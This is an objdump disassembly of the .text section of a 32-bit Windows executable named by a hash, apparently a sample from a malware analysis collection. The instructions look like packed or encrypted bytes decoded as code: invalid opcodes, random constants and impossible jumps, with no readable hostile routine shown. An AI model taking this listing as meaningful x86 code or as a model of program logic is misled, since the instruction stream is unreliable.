
363e4afdbc8571b56b622c8f5e839e3fdea139e38e4b785c9cf9db3a37990466.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sbb    al,0xb8
  411002:	aaa    
  411003:	add    dh,dl
  411005:	add    al,0xdd
  411007:	jae    0x411010
  411009:	sbb    DWORD PTR [eax-0x3f63216d],ebx
  41100f:	imul   edi,DWORD PTR [edi],0x2974436b
  411015:	xor    eax,0xed2ac94b
  41101a:	jmp    0x410f9c
  41101c:	daa    
  41101d:	idiv   BYTE PTR [esi-0x1b9a6d0f]
  411023:	out    0x7b,eax
  411025:	sbb    ah,BYTE PTR [esi-0x5e]
  411028:	inc    edx
  411029:	ja     0x4110a6
  41102b:	seta   ch
  41102e:	push   esp
  41102f:	and    edi,DWORD PTR [esi+0x112a6d76]
  411035:	mov    ecx,0xe5e6a51f
  41103a:	inc    esp
  41103b:	fdivr  DWORD PTR [esi+0x4f]
  41103e:	fld    DWORD PTR [eax+0x13]
  411041:	and    dl,ch
  411043:	add    esp,DWORD PTR [edx+0x17]
  411046:	jns    0x4110b4
  411048:	mov    al,dh
  41104a:	mov    DWORD PTR [ebx],0x49c54bb4
  411050:	jmp    0x5391:0xf9c1eac
  411057:	or     eax,0xef24af52
  41105c:	mov    edx,0xae2e36e0
  411061:	data16 clc 
  411063:	xor    DWORD PTR [ecx],ebp
  411065:	fsubr  QWORD PTR [esi]
  411067:	leave  
  411068:	data16 mov bl,0x6d
  41106b:	aas    
  41106c:	js     0x411061
  41106e:	cdq    
  41106f:	inc    ecx
  411070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411071:	mov    edi,DWORD PTR [ecx]
  411073:	sub    eax,0xbee6ff2e
  411078:	jnp    0x41101f
  41107a:	fmul   QWORD PTR [ecx]
  41107c:	cmp    ch,dh
  41107e:	mov    DWORD PTR [ebx],0x1730da8f
  411084:	rcl    BYTE PTR ds:0x272eda16,cl
  41108a:	dec    esi
  41108b:	or     esp,DWORD PTR [bx+si-0x71]
  41108f:	sub    esi,ecx
  411091:	adc    esp,DWORD PTR [ecx+edi*2-0x7d]
  411095:	int    0x39
  411097:	(bad)  
  411098:	fwait
  411099:	inc    edi
  41109a:	pusha  
  41109b:	jo     0x4110e7
  41109d:	xor    bh,BYTE PTR [esi-0x3efb4a59]
  4110a3:	call   0x71739878
  4110a8:	mov    ebp,0x26097f60
  4110ad:	cmova  ebp,DWORD PTR [ebp-0x4122544b]
  4110b4:	cmp    ch,ch
  4110b6:	rcr    BYTE PTR [eax-0x34f3846d],0xa4
  4110bd:	fnsave [edi+0x10c52b7b]
  4110c3:	mov    ?,WORD PTR [ecx-0x27]
  4110c6:	fcom   DWORD PTR [edx+0x6e]
  4110c9:	into   
  4110ca:	xchg   bl,dh
  4110cc:	mov    ebp,0x257b67a5
  4110d1:	sbb    BYTE PTR [ebx],0x2
  4110d4:	xchg   ecx,eax
  4110d5:	mov    ah,0x4b
  4110d7:	xor    dl,BYTE PTR [edi+0x4e939574]
  4110dd:	jae    0x4110e1
  4110df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e0:	or     al,0x51
  4110e2:	std    
  4110e3:	in     al,0xa4
  4110e5:	cli    
  4110e6:	xchg   ebp,eax
  4110e7:	xor    DWORD PTR ds:0x2123cc29,ebx
  4110ed:	ins    BYTE PTR es:[edi],dx
  4110ee:	repz adc eax,0xa20b7aa1
  4110f4:	and    al,0x57
  4110f6:	sub    ah,ch
  4110f8:	outs   dx,DWORD PTR ds:[esi]
  4110f9:	cwde   
  4110fa:	sbb    ah,BYTE PTR [ebp-0x31fb4551]
  411100:	and    dl,al
  411102:	repz xor BYTE PTR [edx],ah
  411105:	int    0x81
  411107:	jmp    0x4110c8
  411109:	inc    edx
  41110a:	fnstcw WORD PTR [ebp-0x69b57225]
  411110:	xchg   DWORD PTR [eax],ebx
  411112:	and    BYTE PTR [ecx+0x48],dl
  411115:	pop    esp
  411116:	bound  edx,QWORD PTR [edx+0x66]
  411119:	sahf   
  41111a:	loop   0x41115b
  41111c:	jmp    0xa2005e69
  411121:	mov    esi,0xa458e1be
  411126:	pop    ebx
  411127:	pop    ecx
  411128:	mov    ecx,0xcb2c5663
  41112d:	mov    esp,0x3da12db5
  411132:	pushf  
  411133:	les    edi,FWORD PTR [esi]
  411135:	js     0x411180
  411137:	loopne 0x4110d6
  411139:	cmp    ebx,edx
  41113b:	outs   dx,BYTE PTR ds:[esi]
  41113c:	pop    es
  41113d:	cmp    bl,bh
  41113f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411140:	fimul  WORD PTR [eax+0x27f3fb5b]
  411146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411147:	(bad)  
  411149:	pop    ss
  41114a:	push   es
  41114b:	xchg   esp,eax
  41114c:	pop    es
  41114d:	jmp    0x2c2:0x2cd5ece1
  411154:	cwde   
  411155:	xchg   ebp,eax
  411156:	dec    edi
  411157:	and    BYTE PTR [ecx-0x15],al
  41115a:	xor    bl,BYTE PTR [edi]
  41115c:	push   ecx
  41115d:	adc    bh,BYTE PTR gs:[ecx-0x31]
  411161:	out    dx,eax
  411162:	fmul   DWORD PTR [ebx-0xf1069cc]
  411168:	cwde   
  411169:	push   0xc6e9e938
  41116e:	mov    ds:0xd3e3489e,al
  411173:	push   eax
  411174:	fs push ss
  411176:	out    0x9b,al
  411178:	aam    0x40
  41117a:	outs   dx,DWORD PTR ds:[esi]
  41117b:	xor    DWORD PTR [ecx],ebp
  41117d:	shr    DWORD PTR [ecx],0x5c
  411180:	loope  0x411175
  411182:	pop    edi
  411183:	rcr    BYTE PTR [ecx+0x5b],cl
  411186:	push   ds
  411187:	retf   
  411188:	inc    ebx
  411189:	es add al,0xe2
  41118c:	fcmovnb st,st(4)
  41118e:	mov    eax,0x5fd575f7
  411193:	ds fucomip st,st(3)
  411196:	lahf   
  411197:	push   ds
  411198:	rcr    BYTE PTR fs:[esi+eax*2],cl
  41119c:	stos   DWORD PTR es:[edi],eax
  41119d:	mov    dh,0x27
  41119f:	das    
  4111a0:	jb     0x41121a
  4111a2:	add    dl,BYTE PTR [ebx-0x62]
  4111a5:	leave  
  4111a6:	rcl    BYTE PTR [esi-0x63ab2648],1
  4111ac:	or     BYTE PTR [ebx],bh
  4111ae:	sub    BYTE PTR ds:0xb730af93,bl
  4111b4:	ficomp WORD PTR [ecx]
  4111b6:	jo     0x4111e4
  4111b8:	jo     0x411173
  4111ba:	(bad)  
  4111bb:	push   esp
  4111bc:	xor    eax,0xd3daeeec
  4111c1:	mov    ecx,0x32cfe524
  4111c6:	popf   
  4111c7:	inc    eax
  4111c8:	inc    eax
  4111c9:	jp     0x411156
  4111cb:	xchg   ebx,eax
  4111cc:	out    0x54,eax
  4111ce:	sub    DWORD PTR [eax],esi
  4111d0:	gs pop eax
  4111d2:	mov    ds:0x34841bd2,eax
  4111d7:	test   al,0xce
  4111d9:	out    dx,al
  4111da:	xor    BYTE PTR [esi-0x759b7475],cl
  4111e0:	sbb    esp,ebp
  4111e2:	mov    ?,WORD PTR [edi+0x79a822e4]
  4111e8:	(bad)  
  4111e9:	scas   eax,DWORD PTR es:[edi]
  4111ea:	push   0xffffffaa
  4111ec:	call   0xf893e62a
  4111f1:	pop    es
  4111f2:	adc    eax,0xf4bf0360
  4111f7:	ret    
  4111f8:	arpl   WORD PTR [edi],ax
  4111fa:	mov    al,ds:0x1de8b4ab
  4111ff:	push   ds
  411200:	test   BYTE PTR [eax-0x2bdddf4c],bh
  411206:	stos   BYTE PTR es:[edi],al
  411207:	sbb    ah,al
  411209:	xlat   BYTE PTR ds:[ebx]
  41120a:	cmp    eax,0xe112f658
  41120f:	cs stos DWORD PTR es:[edi],eax
  411211:	clc    
  411212:	mov    edi,0x6b08edc4
  411217:	call   0xc3d9:0xf1035bf9
  41121e:	es xor al,0x8b
  411221:	into   
  411222:	(bad)  
  411224:	ret    0x8600
  411227:	inc    ebp
  411228:	inc    ecx
  411229:	aad    0x84
  41122b:	test   DWORD PTR [edx],esp
  41122d:	dec    eax
  41122e:	lds    esi,FWORD PTR [esi+edx*2+0x50cd665e]
  411235:	pop    ecx
  411236:	xchg   edx,eax
  411237:	mov    edx,0x5eff5831
  41123c:	ja     0x41124b
  41123e:	pop    edx
  41123f:	jl     0x411200
  411241:	imul   ebx,DWORD PTR [ebx],0x4b
  411244:	ret    
  411245:	push   esp
  411246:	sub    eax,0x10c3029d
  41124b:	stc    
  41124c:	leave  
  41124d:	(bad)
  411250:	fmul   DWORD PTR [eax+0x3]
  411253:	pushf  
  411254:	jg     0x41123c
  411256:	retf   
  411257:	and    BYTE PTR [ebx],dl
  411259:	push   0x71be7ba7
  41125e:	inc    edx
  41125f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411260:	cs or  eax,0x3d9f537c
  411266:	stc    
  411267:	mov    ss,WORD PTR [ecx+0x66078737]
  41126d:	jecxz  0x411275
  41126f:	sahf   
  411270:	popa   
  411271:	adc    dh,cl
  411273:	push   ebp
  411274:	mov    esp,DWORD PTR [ebp+0x76]
  411277:	jmp    0xad5178df
  41127c:	jg     0x411225
  41127e:	mov    ch,0xc
  411280:	fcomip st,st(3)
  411282:	sub    bh,dl
  411284:	data16 test al,0x4e
  411287:	imul   esi,DWORD PTR [eax],0xffffffd5
  41128a:	ja     0x411224
  41128c:	hlt    
  41128d:	inc    esp
  41128e:	iret   
  41128f:	mov    esi,DWORD PTR [ebp-0x2d]
  411292:	fistp  DWORD PTR [edx+0x26429237]
  411298:	add    ah,BYTE PTR [ecx+0xd]
  41129b:	mov    al,ds:0x7c2dc08d
  4112a0:	jmp    0xdf2054f9
  4112a5:	out    dx,al
  4112a6:	mov    DWORD PTR [esi],esp
  4112a8:	xor    edx,esi
  4112aa:	je     0x4112de
  4112ac:	(bad)  
  4112ae:	and    ch,bl
  4112b0:	lahf   
  4112b1:	rcl    BYTE PTR ds:[edx-0x22],cl
  4112b5:	jbe    0x4112e2
  4112b7:	mov    DWORD PTR [esi+edx*8+0x39],eax
  4112bb:	scas   eax,DWORD PTR es:[edi]
  4112bc:	fs je  0x4112dc
  4112bf:	adc    eax,0xf757431d
  4112c4:	or     eax,DWORD PTR [edx+0x1a]
  4112c7:	jno    0x4112d2
  4112c9:	cli    
  4112ca:	aaa    
  4112cb:	sub    cl,dl
  4112cd:	scas   al,BYTE PTR es:[edi]
  4112ce:	(bad)  
  4112cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112d0:	jg     0x4112c8
  4112d2:	cmp    ebx,0x27065b4c
  4112d8:	iret   
  4112d9:	cli    
  4112da:	and    edx,ebx
  4112dc:	lahf   
  4112dd:	jnp    0x4112d9
  4112df:	lds    esi,FWORD PTR [ebx]
  4112e1:	mov    esi,0x18b14cc8
  4112e6:	stos   BYTE PTR es:[edi],al
  4112e7:	ss in  eax,dx
  4112e9:	out    0xfd,al
  4112eb:	add    BYTE PTR [ecx],ah
  4112ed:	jno    0x4112a3
  4112ef:	sub    DWORD PTR [ebp+0x72110a4d],esp
  4112f5:	nop
  4112f6:	mov    eax,0xcc02aceb
  4112fb:	mov    ah,0x92
  4112fd:	out    0x47,eax
  4112ff:	jb     0x411374
  411301:	in     eax,dx
  411302:	std    
  411303:	out    dx,al
  411304:	dec    esi
  411305:	fldenv [esi+0x4d5e2842]
  41130b:	fiadd  WORD PTR [edi]
  41130d:	mov    eax,ds:0xaeba7239
  411312:	sbb    eax,0x95f4db3
  411317:	pop    es
  411318:	loop   0x41136d
  41131a:	retf   
  41131b:	xchg   esp,eax
  41131c:	inc    esi
  41131d:	ret    
  41131e:	sub    al,0xb4
  411320:	adc    bl,al
  411322:	xor    eax,0x1eed8bb4
  411327:	or     BYTE PTR [ebx-0x2b],bl
  41132a:	into   
  41132b:	xchg   edi,eax
  41132c:	ret    
  41132d:	jmp    0xb00d1461
  411332:	adc    edi,DWORD PTR [edi+0x35bafc3f]
  411338:	stos   DWORD PTR es:[edi],eax
  411339:	cld    
  41133a:	popf   
  41133b:	pop    ss
  41133c:	fbstp  TBYTE PTR [esi+0x47]
  41133f:	xor    eax,0x76f1a384
  411344:	pop    esi
  411345:	ds jns 0x41132c
  411348:	cdq    
  411349:	and    ch,BYTE PTR [esi+0x60f2de79]
  41134f:	test   al,0xa0
  411351:	dec    ecx
  411352:	mov    ds,WORD PTR ds:0xd0aa6de6
  411358:	dec    ebx
  411359:	int3   
  41135a:	retf   0xb2fa
  41135d:	sar    DWORD PTR [edi-0x378c561e],0x8f
  411364:	jl     0x41131a
  411366:	mov    edi,esi
  411368:	repnz stc 
  41136a:	cmp    esp,DWORD PTR [ebx]
  41136c:	xor    DWORD PTR [edi],edx
  41136e:	push   ds
  41136f:	test   BYTE PTR [eax+eax*2-0x41d053f4],dh
  411376:	xor    esp,DWORD PTR [ecx+ecx*8-0x3e]
  41137a:	popf   
  41137b:	outs   dx,BYTE PTR ds:[esi]
  41137d:	dec    edi
  41137e:	outs   dx,BYTE PTR ds:[esi]
  41137f:	mov    dh,BYTE PTR [edi+ebp*1+0x7f]
  411383:	test   eax,0x8a2fc589
  411388:	mov    es,esi
  41138a:	clc    
  41138b:	push   edi
  41138c:	ds dec ebx
  41138e:	xchg   esi,eax
  41138f:	jmp    0xa60d:0x21375a1f
  411396:	cmp    al,0x3e
  411398:	pushf  
  411399:	and    dh,BYTE PTR [eax+0x49]
  41139c:	ins    DWORD PTR es:[edi],dx
  41139d:	adc    eax,DWORD PTR [eax]
  41139f:	call   0x9cfaca6e
  4113a4:	lock sub BYTE PTR [esi],bh
  4113a7:	xchg   BYTE PTR [edx+0x67],bl
  4113aa:	call   0x55360432
  4113af:	jno    0x4113f4
  4113b1:	push   es
  4113b2:	inc    ebx
  4113b3:	or     dl,BYTE PTR [esi-0x6a]
  4113b6:	jb     0x411358
  4113b8:	and    ah,BYTE PTR [eax-0x61]
  4113bb:	sub    al,0x2a
  4113bd:	jmp    0x8697:0xc8b344e6
  4113c4:	add    al,BYTE PTR [edi+eax*2+0x37a39a9e]
  4113cb:	pop    eax
  4113cc:	inc    edi
  4113cd:	stc    
  4113ce:	sub    BYTE PTR [eax-0x2df9c36a],bh
  4113d4:	cli    
  4113d5:	popf   
  4113d6:	mov    al,0x9d
  4113d8:	mov    ah,BYTE PTR [edi-0x183288c]
  4113de:	add    eax,0x5b24d350
  4113e3:	add    dh,BYTE PTR [ecx]
  4113e5:	sub    al,0x5c
  4113e7:	inc    edi
  4113e8:	aaa    
  4113e9:	push   esp
  4113ea:	xchg   edx,eax
  4113eb:	test   BYTE PTR [esi+0x74],0x1d
  4113ef:	or     al,0x19
  4113f1:	sub    ecx,DWORD PTR [edx]
  4113f3:	sub    BYTE PTR [edx-0x16],0x85
  4113f7:	push   edi
  4113f8:	test   ch,al
  4113fa:	jbe    0x411403
  4113fc:	loop   0x41147c
  4113fe:	adc    DWORD PTR [ebx],esp
  411400:	push   ds
  411401:	sub    al,0x28
  411403:	mov    WORD PTR [eax-0x65],cs
  411406:	add    eax,0x997f4f74
  41140b:	call   0xa6165707
  411410:	xor    DWORD PTR [ebp-0x30163e26],edi
  411416:	mov    cl,0xe5
  411418:	xor    al,0xf6
  41141a:	jae    0x411400
  41141c:	lahf   
  41141d:	je     0x4113af
  41141f:	mov    al,ds:0x3d6fa36a
  411424:	and    BYTE PTR [edx],bl
  411426:	enter  0xf912,0x71
  41142a:	or     al,0x58
  41142c:	mov    ch,dh
  41142e:	bound  esp,QWORD PTR [ebx]
  411430:	daa    
  411431:	xchg   BYTE PTR [edx+ebx*2],al
  411434:	outs   dx,BYTE PTR ds:[esi]
  411435:	sub    eax,0x83693524
  41143a:	add    BYTE PTR [edx],bh
  41143c:	bound  ebx,QWORD PTR [eax+esi*4]
  41143f:	loope  0x4114af
  411441:	(bad)  
  411442:	in     al,dx
  411443:	fs push esi
  411445:	xchg   edx,eax
  411446:	(bad)  
  411448:	sub    bh,BYTE PTR [edx+0x45]
  41144b:	mov    al,0xe8
  41144d:	sbb    ecx,esp
  41144f:	jmp    0xf38da5bc
  411454:	sbb    eax,ebx
  411456:	fistp  DWORD PTR [ebp-0x46e402b3]
  41145c:	or     eax,0x1790bda6
  411461:	mov    ah,0x67
  411463:	imul   esp,DWORD PTR [ebx],0x55
  411466:	and    bl,dh
  411468:	icebp  
  411469:	lods   eax,DWORD PTR ds:[esi]
  41146a:	dec    ebp
  41146b:	xchg   esi,eax
  41146c:	ds xchg dh,bl
  41146f:	shl    eax,cl
  411471:	loop   0x411484
  411473:	bound  esp,QWORD PTR [ecx-0x26e57489]
  411479:	shr    BYTE PTR [ebx+0x42839d],0x99
  411480:	loope  0x41146d
  411482:	and    eax,0x629eda83
  411487:	mov    esp,0xff0711c4
  41148c:	test   eax,0xe5c722c9
  411491:	adc    BYTE PTR [ebx+ecx*1+0x2c],cl
  411495:	call   0x3639:0xbbb93c77
  41149c:	out    0x82,al
  41149e:	xchg   ecx,eax
  41149f:	pop    sp
  4114a1:	cld    
  4114a2:	mov    ecx,0x494da63a
  4114a7:	inc    BYTE PTR [edx-0x31779c39]
  4114ad:	push   ecx
  4114ae:	adc    ebx,DWORD PTR [eax+edx*2]
  4114b1:	dec    eax
  4114b2:	lds    esi,FWORD PTR [edx-0x1d]
  4114b5:	sbb    eax,DWORD PTR [ebp+0x4097e667]
  4114bb:	cmp    eax,0x6f317a69
  4114c0:	sub    dl,BYTE PTR ds:0xa291096c
  4114c6:	adc    DWORD PTR [ebp+0x1e],eax
  4114c9:	pushf  
  4114ca:	js     0x4114ae
  4114cc:	mov    cl,0xb9
  4114ce:	xchg   BYTE PTR [esi+0x481c8676],cl
  4114d4:	inc    ebp
  4114d5:	xor    ah,BYTE PTR [edi]
  4114d7:	inc    ecx
  4114d8:	mov    cl,0xf2
  4114da:	xor    BYTE PTR [ebx+eax*8+0x55],cl
  4114de:	std    
  4114df:	or     DWORD PTR ds:0x6d03d380,edx
  4114e5:	sub    eax,0x4259d6ed
  4114ea:	mov    bl,0x45
  4114ec:	(bad)  
  4114ed:	in     al,dx
  4114ee:	enter  0xbdfd,0xad
  4114f2:	sub    ch,BYTE PTR ds:0xed028574
  4114f8:	(bad)  
  4114f9:	push   edx
  4114fa:	jp     0x41154d
  4114fc:	mov    esp,es
  4114fe:	inc    edx
  4114ff:	push   ds
  411500:	in     al,dx
  411501:	pop    ebx
  411502:	in     eax,0xc5
  411504:	mov    WORD PTR [esi],?
  411506:	loopne 0x41151f
  411508:	push   0x3
  41150a:	dec    eax
  41150b:	sbb    bh,BYTE PTR [edx-0x8]
  41150e:	jmp    0x411539
  411510:	mov    eax,ds:0x3d94e6aa
  411515:	lods   eax,DWORD PTR ds:[esi]
  411516:	nop
  411517:	mov    cl,0xff
  411519:	jae    0x411566
  41151b:	popa   
  41151c:	xchg   ebx,eax
  41151d:	or     bl,bl
  41151f:	jle    0x4114d1
  411521:	mov    eax,0x87354668
  411526:	jge    0x411595
  411528:	(bad)  
  411529:	push   eax
  41152a:	shl    BYTE PTR [ebx+ebx*8],0x1d
  41152e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41152f:	jg     0x41151d
  411531:	cld    
  411532:	mov    cl,0xd1
  411534:	inc    esp
  411535:	pop    esi
  411536:	or     eax,0x40c8bbab
  41153b:	stos   BYTE PTR es:[edi],al
  41153c:	jbe    0x411560
  41153e:	jno    0x4114e1
  411540:	mov    cl,bl
  411542:	test   DWORD PTR [ebp+0x65],edi
  411545:	and    ah,ah
  411547:	jbe    0x4115a5
  411549:	adc    ah,al
  41154b:	iret   
  41154c:	hlt    
  41154d:	push   ds
  41154e:	aam    0xfb
  411550:	adc    bl,BYTE PTR [ebx+0x790e011d]
  411556:	push   esp
  411557:	div    DWORD PTR [ebp-0x72]
  41155a:	and    BYTE PTR [ecx+ecx*4-0x30093b7a],0xbe
  411562:	mov    dh,0xe7
  411564:	mov    WORD PTR [ecx+0x26],es
  411567:	push   ebx
  411568:	in     al,dx
  411569:	push   ds
  41156a:	ja     0x411565
  41156c:	jnp    0x411501
  41156e:	mov    eax,0x592144ae
  411573:	lea    edx,[edi-0x3a59fcdc]
  411579:	mov    eax,DWORD PTR [ebp-0x4f1812c8]
  41157f:	(bad)  
  411581:	out    0x1d,eax
  411583:	xor    DWORD PTR [edx+eax*4-0x65],0x1b9f1bd9
  41158b:	bound  eax,QWORD PTR [eax-0x70]
  41158e:	dec    edx
  41158f:	loop   0x41159a
  411591:	pop    eax
  411592:	add    BYTE PTR [eax+eax*2+0x27],cl
  411596:	paddw  mm1,QWORD PTR [esp+esi*8-0x6f]
  41159b:	fidiv  DWORD PTR [edi-0x3d]
  41159e:	jbe    0x4115bc
  4115a0:	loopne 0x411554
  4115a2:	data16 inc di
  4115a5:	mul    BYTE PTR [edi+0x2254198f]
  4115ab:	add    BYTE PTR [ebp+0x4f],dh
  4115ae:	xchg   ecx,eax
  4115af:	push   esi
  4115b0:	mov    cl,0x57
  4115b2:	sub    BYTE PTR [ebx+eiz*8],ah
  4115b5:	xchg   esi,eax
  4115b6:	mov    dh,0x53
  4115b8:	dec    ebp
  4115b9:	inc    edx
  4115ba:	adc    eax,0xfafd420d
  4115bf:	or     al,0x82
  4115c1:	mov    eax,ds:0x48246039
  4115c6:	jne    0x411576
  4115c8:	mov    ebp,0x205b094b
  4115cd:	push   0x73
  4115cf:	mov    dl,0x9b
  4115d1:	pop    esp
  4115d2:	mov    al,0x7a
  4115d4:	xchg   ecx,eax
  4115d5:	jnp    0x41157d
  4115d7:	test   BYTE PTR [esi-0x4e],ah
  4115da:	add    ah,cl
  4115dc:	lods   eax,DWORD PTR ds:[esi]
  4115dd:	sbb    al,0x59
  4115df:	(bad)  
  4115e0:	jb     0x411642
  4115e2:	mov    bh,0x6f
  4115e4:	pushf  
  4115e5:	dec    ebp
  4115e6:	xor    ah,ah
  4115e8:	add    bh,BYTE PTR [edi+0x733c923b]
  4115ee:	xchg   esp,eax
  4115ef:	leave  
  4115f0:	mov    ch,0x23
  4115f2:	pop    edi
  4115f3:	leave  
  4115f4:	imul   eax,DWORD PTR [ebp+0x5a38dee3],0xffffffb4
  4115fb:	ss inc esp
  4115fd:	pop    ebx
  4115fe:	dec    edi
  4115ff:	sbb    ah,BYTE PTR ds:0xbfc29327
  411605:	lahf   
  411606:	pop    ds
  411607:	pushf  
  411608:	xor    ch,cl
  41160a:	xchg   esp,eax
  41160b:	add    DWORD PTR [edx+0x27],esp
  41160e:	ret    0x738
  411611:	jl     0x4115ec
  411613:	aad    0x23
  411615:	ret    
  411616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411617:	hlt    
  411618:	adc    eax,eax
  41161a:	jmp    0x4115e3
  41161c:	add    al,0xbc
  41161e:	inc    ebp
  41161f:	mov    ds:0xc9c5653d,al
  411624:	push   cs
  411625:	pusha  
  411626:	adc    edi,DWORD PTR [ebp-0x2d]
  411629:	outs   dx,DWORD PTR ds:[esi]
  41162a:	mov    dh,0xb8
  41162c:	or     eax,0x7769b771
  411631:	sub    BYTE PTR gs:[eax+eax*4-0x60],dl
  411636:	xchg   DWORD PTR [ebx-0x5b],esi
  411639:	sub    esp,esi
  41163b:	and    al,0x67
  41163d:	cmp    BYTE PTR [ecx+ebx*2],al
  411640:	jo     0x411678
  411642:	outs   dx,DWORD PTR ds:[esi]
  411643:	xchg   DWORD PTR [ebx],esi
  411645:	xor    DWORD PTR [edx-0xc],ebx
  411648:	test   ecx,edi
  41164a:	(bad)  
  41164b:	clc    
  41164c:	adc    eax,0xedc7496e
  411651:	xor    ebp,DWORD PTR [ebp-0x66991889]
  411657:	sub    cl,BYTE PTR [edx]
  411659:	push   ss
  41165a:	push   eax
  41165b:	loope  0x41169e
  41165d:	and    esp,DWORD PTR [ebx+0x13]
  411660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411661:	jne    0x411641
  411663:	sbb    al,0x27
  411665:	mov    edi,0xe9c3bc00
  41166a:	jmp    DWORD PTR [esi-0x6a]
  41166d:	xchg   esp,eax
  41166e:	jne    0x41168d
  411670:	in     eax,dx
  411671:	loopne 0x411683
  411673:	retf   0x6667
  411676:	pushf  
  411677:	(bad)  
  411678:	jge    0x41163b
  41167a:	or     al,0xd6
  41167c:	fmul   QWORD PTR ss:[ebp-0x37]
  411680:	mov    ebx,0x24592e25
  411685:	add    al,0x97
  411687:	ja     0x4116f9
  411689:	(bad)  
  41168a:	cmp    BYTE PTR [edi],dl
  41168c:	add    ch,ah
  41168e:	mov    esp,0xd3900fbc
  411693:	and    ebx,DWORD PTR [esp+eax*8]
  411696:	test   al,0x1b
  411698:	sub    eax,0x742a36b
  41169d:	mov    edi,0xdf382c6
  4116a2:	shl    DWORD PTR [edx-0x6],cl
  4116a5:	cs int 0xb8
  4116a8:	cmp    BYTE PTR [eax+0x166f92c8],ch
  4116ae:	enter  0x4851,0xe2
  4116b2:	pop    esp
  4116b3:	in     al,0x25
  4116b5:	or     eax,0x43bcb96e
  4116ba:	outs   dx,BYTE PTR ds:[esi]
  4116bb:	cmp    edi,DWORD PTR ds:0x645c765e
  4116c1:	icebp  
  4116c2:	push   esi
  4116c3:	mov    esp,?
  4116c5:	jge    0x41167a
  4116c7:	mov    ds:0xba5080de,al
  4116cc:	pop    ss
  4116cd:	jbe    0x411716
  4116cf:	and    eax,0xfcb23d17
  4116d4:	sub    DWORD PTR [ecx+0x69],0xd762a971
  4116db:	xor    eax,0x2e6c7214
  4116e0:	test   DWORD PTR [ecx+0x5f],esi
  4116e3:	test   al,0x90
  4116e5:	sbb    eax,0x52e5c77d
  4116ea:	bound  ecx,QWORD PTR [ecx-0x724f2233]
  4116f0:	ins    BYTE PTR es:[edi],dx
  4116f1:	cmp    DWORD PTR ds:0x70a9b50b,0x9050f86a
  4116fb:	je     0x4116d4
  4116fd:	call   FWORD PTR [esi+0x2dc31e9f]
  411703:	in     al,0xd6
  411705:	jns    0x4116be
  411707:	ret    0x5a43
  41170a:	pop    ecx
  41170b:	stc    
  41170c:	xor    esp,DWORD PTR [eax-0x5e]
  41170f:	xchg   esi,eax
  411710:	fbld   TBYTE PTR [edx-0x3fa45e04]
  411716:	xchg   ebx,eax
  411717:	add    BYTE PTR [edi+0x6437aa06],0x35
  41171e:	xchg   edx,eax
  41171f:	adc    eax,DWORD PTR [ebp-0xc50e7e0]
  411725:	cs dec edi
  411727:	rcr    DWORD PTR [edx+0x59],1
  41172a:	jbe    0x411759
  41172c:	in     eax,0xe8
  41172e:	lds    ecx,FWORD PTR [esi]
  411730:	cmp    BYTE PTR [ebx],0x75
  411733:	rol    DWORD PTR [esi+0x63],0x6e
  411737:	popa   
  411738:	jns    0x4116f1
  41173a:	dec    edi
  41173b:	lods   eax,DWORD PTR ds:[esi]
  41173c:	cli    
  41173d:	sbb    ah,BYTE PTR [esi+0x7f5b0a3a]
  411743:	cmp    eax,0x19cfb8d3
  411748:	inc    edi
  411749:	sbb    eax,DWORD PTR [ebx-0x36]
  41174c:	fldcw  WORD PTR [eax+0x6cea8ff2]
  411752:	add    al,0xed
  411754:	jo     0x411751
  411756:	(bad)  
  411757:	shr    bh,0x57
  41175a:	call   0x2a45dfed
  41175f:	xor    dh,dl
  411761:	jg     0x411728
  411763:	dec    ecx
  411764:	and    eax,0x7f3f871a
  411769:	pop    ebp
  41176a:	xchg   BYTE PTR [esi-0x6d39ade7],bh
  411770:	push   ss
  411771:	add    eax,0xd11b5bc
  411776:	cmp    esp,edi
  411778:	sbb    al,0xf2
  41177a:	xchg   BYTE PTR [ebp+0x2a],al
  41177d:	test   esi,edi
  41177f:	repnz inc esi
  411781:	fdivr  DWORD PTR [ecx-0x1a71c5ab]
  411788:	and    ebx,ecx
  41178a:	sub    BYTE PTR [edi+0x4a],dl
  41178d:	clc    
  41178e:	clc    
  41178f:	retf   0x3dae
  411792:	pop    ss
  411793:	sub    al,0x72
  411795:	pop    ss
  411796:	xchg   esi,esp
  411798:	and    eax,0x63ad4273
  41179d:	(bad)
  4117a2:	bswap  ebx
  4117a4:	cmp    eax,DWORD PTR [edx]
  4117a6:	jnp    0x4117c3
  4117a8:	lea    ecx,[edi]
  4117aa:	inc    ebx
  4117ab:	ret    0x1564
  4117ae:	inc    edi
  4117af:	hlt    
  4117b0:	retf   0x3ffe
  4117b3:	sahf   
  4117b4:	push   ss
  4117b5:	rcl    BYTE PTR [ecx-0x39],cl
  4117b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117b9:	push   cs
  4117ba:	ja     0x4117b5
  4117bc:	fsubr  st,st(1)
  4117be:	xor    DWORD PTR [ebx-0x32b5e856],edi
  4117c4:	scas   eax,DWORD PTR es:[edi]
  4117c5:	xchg   ecx,eax
  4117c6:	stc    
  4117c7:	sub    eax,ebx
  4117c9:	sub    ch,BYTE PTR [ecx-0x28]
  4117cc:	inc    DWORD PTR ds:0xaa5b1d18
  4117d2:	mov    ds:0x723c10af,eax
  4117d7:	imul   edx,esi,0x5d9aa78f
  4117dd:	addr16 jp 0x4117c2
  4117e0:	sbb    eax,0x90709db5
  4117e5:	shl    DWORD PTR [ebx-0xf2ce60e],0xae
  4117ec:	sti    
  4117ed:	pop    ss
  4117ee:	xlat   BYTE PTR ds:[ebx]
  4117ef:	lods   al,BYTE PTR ds:[esi]
  4117f0:	pop    ebp
  4117f1:	ret    
  4117f2:	repnz pop eax
  4117f4:	adc    DWORD PTR [esp+eax*2-0x737584a8],edx
  4117fb:	or     dh,BYTE PTR [eax+eiz*1]
  4117fe:	jne    0x411805
  411800:	jb     0x411875
  411802:	fsub   DWORD PTR [eax+ebx*1]
  411805:	call   0xc4fca511
